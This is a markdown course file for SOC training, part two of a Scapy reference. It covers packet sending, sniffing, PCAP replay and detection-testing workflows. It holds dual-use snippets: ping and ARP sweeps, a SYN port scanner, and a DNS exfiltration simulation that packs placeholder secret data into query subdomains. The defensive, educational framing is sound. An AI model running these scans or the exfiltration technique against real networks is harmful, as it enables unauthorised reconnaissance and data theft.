# Scapy - part 2

- For part 1, check out [scapy_documentation_part1.md](./scapy_documentation_part1.md)
- For lab, check out [scapy_lab.md](/courseFiles/Section_04-socScripting/scapy_lab.md)
- For lab solution, check out [scapy_lab_solution.md](/courseFiles/Section_04-socScripting/scapy_lab_solution.md)

# Common Modules, Classes & Functions (API Reference)



## Important imports

- Common import pattern used in examples:
```python
from scapy.all import *
```
- Or, to keep namespace smaller:
```python
from scapy.all import IP, TCP, UDP, Ether, ARP, DNS, DNSQR, Raw, sniff, send, sendp, sr, sr1, srp, wrpcap, rdpcap
```
---

## 1) Sending & request/response helpers

>[!IMPORTANT]
>
>Scapy offers both *send-only* functions (fire-and-forget) and *send-and-wait-for-replies* helpers. Choose layer-2 vs layer-3 variants depending on whether you construct Ethernet frames (`Ether()/...`) or rely on the OS to build the link-layer header.

### `send(pkt, iface=None, count=1, inter=0, verbose=True)`

- **Layer**: L3 (IP-level) — Scapy won't add an Ethernet header.
- **Use when**: Sending IP/TCP/UDP packets relying on kernel to handle link-layer.
- **Key params**:
  - `pkt`: Packet or list of packets.
  - `iface`: interface name (if omitted uses `conf.iface`).
  - `count`: times to send each packet (for testing repetition).
  - `inter`: seconds between each send.
- **Return**: `None` (fire-and-forget).

**Example — send a single TCP SYN**

```python
send(IP(dst='10.0.0.5')/TCP(dport=80, flags='S'), iface='eth0')
```

>[!TIP]
>
> `send()` is useful for simple checks but does not collect replies — use `sr()`/`sr1()` for interactive tests.

### `sendp(pkt, iface=None, count=1, inter=0, verbose=True)`

- **Layer**: L2 (Ethernet) — use when you have `Ether()` frames or need to set MAC addresses.
- **Use when**: ARP spoofing, sending crafted Ethernet frames, VLAN-tagged frames.
- **Return**: `None`.

**Example — raw Ethernet frame**

```python
sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.10'), iface='eth0')
```

### `sr(packets, timeout=2, retry=0, iface=None, verbose=True)`

- **Layer**: L3 request/response (IP-level). Sends packets and collects answers.
- **Return**: tuple `(answered, unanswered)` where `answered` is an `SndRcvList` of `(sent, received)` pairs and `unanswered` is a `PacketList`.

**Example — ping sweep (ICMP)**

```python
ans, unans = sr(IP(dst='10.0.0.1-254')/ICMP(), timeout=1)
for sent, received in ans:
    print(received.src, 'responded')
```

>[!TIP]
>
> Useful for probes where you need the response content (ICMP payloads, TTL differences, or error codes).

### `sr1(pkt, timeout=2, iface=None, verbose=True)`

- **Layer**: L3
- **Behavior**: Send a single packet and return the first response packet (or `None`)
- **Return**: `Packet` or `None`.

**Example — single DNS query**

```python
resp = sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='example.com')), timeout=3)
if resp:
    resp.show()
```

### `srp(packets, timeout=2, retry=0, iface=None, verbose=True)`

- **Layer**: L2 (Ethernet-level request/response)
- **Use when**: You built `Ether()` frames (ARP discovery is common).
- **Return**: `(answered, unanswered)` similar to `sr()` but at L2.

**Example — ARP scan**

```python
ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='192.168.1.0/24'), timeout=2, iface='eth0')
for s,r in ans:
    print(r.psrc, r.hwsrc)
```

### `srp1(pkt, timeout=2, iface=None, verbose=True)`

- **Layer**: L2
- **Return**: the first answer packet or `None`.

### `srloop(pkt, ...)`

- **Behavior**: Send packets in a loop and receive responses (useful for continuous monitoring/discovery).
- **Use with caution**: continuous traffic can be noisy; use short intervals and limits.

## 2) Sniffing & capturing

`sniff()` is Scapy's primary capture function — it's flexible and can call a callback for each packet.

### `sniff(count=0, iface=None, timeout=None, filter=None, lfilter=None, prn=None, store=True, stop_filter=None)`

- stop after `count` packets (0 = unlimited unless `timeout`).
-  interface name or list. Use `conf.iface` if omitted.
-  seconds to wait before returning.
-  BPF string (executed in kernel/libpcap for speed, e.g., `"tcp and port 80"`).
-  Python function `lambda pkt: True/False` applied post-capture (slower but can use decoded fields).
-  callback `lambda pkt: ...` executed for each packet. Return value from `prn` is printed if `prn` returns something and `verbose` is enabled. //useful for real-time processing ;)
-  whether to keep packets in memory (set `False` for long-running captures where you only act on each packet).
-  a function that when returns True stops sniffing; runs for each packet.

**Simple example — capture 10 HTTP packets**

```python
pkts = sniff(count=10, filter='tcp port 80', iface='eth0')
for p in pkts:
    print(p.summary())
```

**Callback example — log HTTP GETs**

```python
def http_logger(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport==80 and Raw in pkt:
        payload = pkt[Raw].load
        if payload.startswith(b'GET'):
            print('HTTP GET from', pkt[IP].src)

sniff(filter='tcp port 80', prn=http_logger, store=False)
```

**BPF vs lfilter**

- Prefer `filter` when you can express the condition in BPF (much faster, kernel-level). Use `lfilter` when you need decoded fields or complex checks.

### `AsyncSniffer` (background sniffing)

- Useful to run sniffing in a thread and interact with the program concurrently.

**Example**

```python
from scapy.all import AsyncSniffer
s = AsyncSniffer(iface='eth0', filter='icmp', prn=lambda p: p.summary())
s.start()
#-----------------
s.stop()
pkts = s.results
```

>[!TIP]
>
>`AsyncSniffer` is handy for launching a capture while your script triggers test traffic.

## 3) PCAP read/write & replay

### `wrpcap(filename, packets)`

- Write list of packets to a PCAP file. Overwrites by default.
- Use for archiving captures or creating files to replay in other tools.

### `rdpcap(filename)`

- Read PCAP file into a `PacketList`.

**Example — read, filter, write**

```python
pkts = rdpcap('capture.pcap')
http = [p for p in pkts if p.haslayer(TCP) and p[TCP].dport==80]
wrpcap('http_only.pcap', http)
```

### Replaying PCAPs

- Use Scapy's `sendp()` on `rdpcap()` results to replay at L2: `sendp(rdpcap('attack.pcap'), iface='eth0')`.
- For high-performance replay use `tcpreplay` which is optimized for wire-speed.

## 4) Utility functions & helpers

### `hexdump(pkt)` / `hexdump(bytes)`

- Human-friendly hex/ASCII dump. Useful to inspect payloads or unknown protocols.

### `ls(obj)`

- List fields for a layer or a packet class.

### `raw(pkt)` / `bytes(pkt)`

- Serialized bytes of the packet.

### `conf` object (global config)

- `conf.iface` — default interface name.
- `conf.verb` — verbosity level // 0 = silent, higher = more output
- `conf.route` — access to route table.
- `conf.sniff_promisc` — whether sniff uses promiscuous mode.
- `conf.L3socket` / `conf.L2socket` — classes used for sending/receiving.

**Example — set defaults**

```python
conf.iface = 'eth0'
conf.verb = 0  # silence verbose output from Scapy
```

## 5) High-level network tools

Scapy includes higher-level tools built on top of send/sr/sniff:

### `traceroute(dst, dport=None, maxttl=30, **kwargs)`

- Performs traceroute-like probing using UDP/TCP/ICMP. Returns a `TracerouteResult` that you can inspect.

### `arping(net)`

- Convenience wrapper for ARP-based discovery (sends ARP who-has to network).

### `srloop()`

- Run `sr()` repeatedly in a loop — useful for continuous monitors or scans.

### `sniff()` wrappers and `prn` helpers

- Many users build tiny `prn` functions to extract fields and forward them to logging stacks, SIEMs, or message queues.

## 6) Return types & result objects

- `sr()` / `srp()` → `(answered, unanswered)`:
  - `answered` is an iterable of `(sent_packet, received_packet)` pairs. Each element can be inspected with `.show()` or fields accessed normally.
  - `unanswered` is a `PacketList` of packets that did not receive replies.
- `sr1()` / `srp1()` → single `Packet` or `None`.
- `sniff()` → `PacketList` (unless `store=False`, when results are not kept in memory; `AsyncSniffer` stores in `.results`).

**Example — interpreting sr() results**

```python
ans, unans = sr(IP(dst='10.0.0.1-254')/ICMP(), timeout=1)
for snd, rcv in ans:
    print(snd.dst, '->', rcv.src, rcv.summary())
```

## 7) Practical examples

### a) Quick ARP discovery

```python
ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst='10.0.0.0/24'), timeout=2)
for s,r in ans:
    print(f'{r.psrc} -> {r.hwsrc}')
```

### b) Basic SYN port scanner // !!non-stealthy

```python
ans, _ = sr(IP(dst='10.0.0.5')/TCP(dport=[22,80,443], flags='S'), timeout=2)
for s,r in ans:
    if r.haslayer(TCP) and r[TCP].flags == 0x12:  # SYN+ACK
        print('open', r.sprintf('%TCP.sport%'))
```

### c) DNS exfil simulation (single query with encoded payload)

```python
payload = 'SECRET-DATA-BASE64'
qname = payload + '.example.com'
resp = sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=qname)), timeout=3)
```

### d) Capture and save suspicious traffic to PCAP

```python
pkts = sniff(filter='tcp and (port 80 or port 443)', count=100, iface='eth0')
wrpcap('suspect_capture.pcap', pkts)
```

### e) Sniff & send JSON events to a local collector

```python
import json

def callback(p):
    if p.haslayer(IP):
        ev = {
            'time': p.time,
            'src': p[IP].src,
            'dst': p[IP].dst,
            'proto': p[IP].proto,
        }
        print(json.dumps(ev))

sniff(filter='ip', prn=callback, store=False)
```

## 8) Performance & scaling notes

- `sniff()` with `store=True` keeps packets in memory — avoid for large captures.
- Use kernel-level `filter` (BPF) to reduce packet volume before Python-level processing.
- For high-throughput testing use specialized tools (`tcpreplay`, `pktgen`) rather than Scapy's `sendp()`.

## 9) Troubleshooting & personal tips




- **Inspect `sr()` results carefully**: If `sr()`/`srp()` returns unexpected structures, iterate the `answered` result as `for snd, rcv in ans:` and use `snd.show()` / `rcv.show()` to see raw field values. Use `ans.summary()` for a compact overview.

- **Use BPF filters to reduce noise**: When sniffing large networks, provide a `filter` (BPF) argument to `sniff()` to drop irrelevant traffic in kernel space (for example `"tcp and port 80"`). Only use `lfilter` for conditions that require decoded fields or Python logic — it's slower because it runs in user space.

- **Permission errors**: "Operation not permitted" or socket errors usually mean you need elevated privileges. Run as root/Administrator or use capabilities (eX: `setcap cap_net_raw,cap_net_admin+eip $(which python3)` on Linux) if appropriate.



- **Interface selection mistakes**: `conf.iface` may not be the interface you expect (Docker, VPN, or virtual adaptors can change defaults). Print `show_interfaces()` or `ifconfig/ip a` to confirm the correct interface.

- **Promiscuous mode & virtual networks**: Some virtual network adapters or cloud environments disable promiscuous mode. If you expect to see traffic between other VMs, ensure the virtual switch supports promiscuous mode.


- **Large captures & memory**: Avoid `store=True` for long-running sniffing. Either use `prn` callbacks to stream results to disk/DB or capture to file with `tcpdump -w` and analyze offline with `rdpcap()`.

- **Packet fragmentations & MTU**: When sending large payloads, underlying layers may fragment packets. If you depend on a single-packet payload, set `DF` (Don't Fragment) or split manually and handle reassembly in analysis.











- **lfilter performance traps**: Avoid expensive Python operations in `lfilter`/`prn` (ex: regex on full payloads) for high-volume captures; instead extract minimal fields and enqueue heavy processing to worker threads.

- **Replaying PCAPs correctly**: When replaying PCAPs into a network, consider MAC/IP rewriting so that replies route back correctly (or run target in same L2 segment). `sendp()` replays raw frames; if original MACs belong to different hosts, update them before replay.



- **Use `conf.verb` to control noise**: Libraries and Scapy itself may print verbose logs — set `conf.verb = 0` in scripts to keep logs clean for logging to SIEMs.

- **AsyncSniffer quirks**: `AsyncSniffer.results` is only populated after `stop()`; ensure you `join()` or `stop()` before accessing results in your main thread.


# Typical SOC Workflows & Example Scripts



## 1) Typical SOC workflows using Scapy

### A. Generate labeled ground-truth for rule testing

**Goal:** Create small, labeled datasets that trigger specific IDS/SIEM detections so you can validate rules and measure false positives.

 **Steps:**

1. Craft the traffic that should trigger the rule (e.g., DNS tunneling, HTTP with exfil payload, suspicious SMB activity).
2. Tag the traffic (write metadata into JSON or filename) and save PCAPs with `wrpcap()`.
3. Replay the PCAP in an isolated testbed and assert IDS/IPS alerts fire.

**Why:** Ground-truth allows deterministic validation of detection logic and regression testing as rules evolve.

---

### B. Replay & regression testing of detection rules

**Goal:** Continuously validate that detection rules catch known samples and that changes don't regress.

 **Steps:**

1. Maintain a repository of benign and malicious PCAPs.
2. Use `rdpcap()` + `sendp()` or `tcpreplay` to inject traffic into test network segments.
3. Automate rule execution: run Suricata/Zeek on the segment, capture alerts/logs, and compare to expected results.

>[!TIP]
>
>**Automation tip:** Wrap replay and rule checks into CI pipelines (GitHub Actions/GitLab CI) that run in disposable VMs or containers.

---

### C. On-demand enrichment for alerts

**Goal:** When an alert triggers, programmatically collect network artifact snapshots to enrich the alert (live ARP, traceroute, port checks).

**Steps:**

1. Alert in SIEM contains suspicious IP/hostname.
2. Run Scapy enrichment script: ARP query, TCP SYN to common ports, traceroute to the IP.
3. Append the results to the SIEM event (via API) for analyst context.

**Safety:** Run enrichment in read-only mode. Keep enrichment timeouts short. //don't send payloads that could be considered hostile!!!



---

### D. Forensic analysis & packet-level automation

**Goal:** Programmatically parse and extract indicators from PCAPs (e.g., extract all HTTP Host headers, top DNS queries, suspicious User-Agent strings).

**Steps:**

1. `rdpcap()` to load capture (or stream via `sniff()` with callbacks).
2. Filter and extract features (e.g., `p[HTTP].Host` if using a parser or parse `Raw` payload).
3. Output CSV/JSON for ingestion into analytics or ML pipelines.

**Use case:** Accelerate triage by extracting IOC lists from captured traffic.

---

## 2) Ready-to-run example scripts

Below are practical scripts I'Ve made,intended for educational use!! — change IPs, interfaces, and timeouts for your environment. Run as root/Administrator in isolated VM's;

### Script A — ARP discovery scanner (print live hosts)


- Check out [arp_discovery.py](/courseFiles/Section_04-socScripting/arp_discovery.py)


### Script B — SYN port scanner with CSV output

- Check out [syn_scan.py](/courseFiles/Section_04-socScripting/syn_scan.py)



### Script C — DNS exfil simulation (split payload across subdomains)

- Check out [dns_exfil.py](/courseFiles/Section_04-socScripting/dns_exfil.py)

### Script D — PCAP reader & indicator extractor (HTTP Host, DNS queries)

- Check out [extract_iocs.py](/courseFiles/Section_04-socScripting/extract_iocs.py)

---


Also check out [this official Scapy documentation](https://scapy.readthedocs.io/en/latest/index.html)

---


*End of Part 2. For part 1, check out [scapy_documentation_part1.md](./scapy_documentation_part1.md)*

*For lab, check out [scapy_lab.md](/courseFiles/Section_04-socScripting/scapy_lab.md)*

*For lab solution, check out [scapy_lab_solution.md](/courseFiles/Section_04-socScripting/scapy_lab_solution.md)*

---
[Back to the Section](/courseFiles/Section_04-socScripting/socScripting.md)